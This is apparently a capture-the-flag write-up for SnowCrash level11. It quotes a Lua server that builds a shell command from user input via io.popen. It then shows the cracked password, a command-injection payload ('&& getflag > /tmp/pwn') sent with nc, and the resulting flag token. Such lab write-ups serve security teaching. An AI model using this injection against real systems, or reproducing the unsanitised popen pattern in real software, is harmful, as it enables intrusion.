> #!/usr/bin/env lua
> local socket = require("socket")
> local server = assert(socket.bind("127.0.0.1", 5151))
> 
> function hash(pass)
>   prog = io.popen("echo "..pass.." | sha1sum", "r")
>   data = prog:read("*all")
>   prog:close()
>
>   data = string.sub(data, 1, 40)
> 
>   return data
> end
>
>
> while 1 do
>   local client = server:accept()
>   client:send("Password: ")
>   client:settimeout(60)
>   local l, err = client:receive()
>   if not err then
>       print("trying " .. l)
>       local h = hash(l)
> 
>       if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
>           client:send("Erf nope..\n");
>       else
>           client:send("Gz you dumb*\n")
>       end
> 
>   end
> 
>   client:close()
> end
> 
# We have a lua script inside this level, if we reverse the hash that it checks with rainbow table we have
# NotSoEasy
# So let's try this as password
# we see that matching the command "echo -n NotSoEasy | sha1sum" we get the same hash
< level11@SnowCrash:~$ nc 127.0.0.1 5151
< Password: -n NotSoEasy
< Gz you dumb*
# But also notice we can inject a code inside the command popen that executes the echo with our variable name
# Between the echo and the pipe, where our variable name will go, we put another command
# So let's try the bash injection with this as a password :
# '&& getflag > /tmp/pwn'
< level11@SnowCrash:~$ nc 127.0.0.1 5151
< Password: && getflag > /tmp/pwn
< Erf nope..
# And check after if the file exist 
< level11@SnowCrash:~$ cat /tmp/pwn
> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
